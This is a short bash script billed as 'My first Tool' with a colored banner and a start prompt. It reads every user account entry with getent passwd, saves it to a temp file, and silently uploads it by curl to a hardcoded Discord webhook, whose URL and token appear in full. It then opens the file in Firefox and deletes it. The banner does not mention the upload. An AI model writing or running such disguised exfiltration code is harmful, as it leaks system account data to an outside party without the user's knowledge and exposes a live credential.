#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
RESET='\033[0m'
color_echo() {
  local color=$1
  local message=$2
  echo -e "${color}${message}${RESET}"
}
color_echo $RED "###############################################"

color_echo $GREEN "          Welcome To My first Tool           "

color_echo $RED "###############################################"

discord_webhook_url="https://discord.com/api/webhooks/1118111148311580672/otx_jEiLZwgb5ohrlxFOYcH3RJvFXiDPPllBIIua_pDdvT-u2P_WGUA0sws7bAO6wf1W"

read -p "Do you want to start the script? (y/n): " confirm

if [[ $confirm == "y" || $confirm == "Y" ]]; then
  # Get information for all users
  user_info=$(getent passwd)

  timestamp=$(date +%Y%m%d%H%M%S)
  temp_file="/tmp/user_info_$timestamp.html"

  echo "<pre>$user_info</pre>" > "$temp_file"

  curl -F "file=@$temp_file" "$discord_webhook_url"

  firefox "file://$temp_file" &

  sleep 10
  rm "$temp_file"
else
  echo "Script execution canceled."
fi

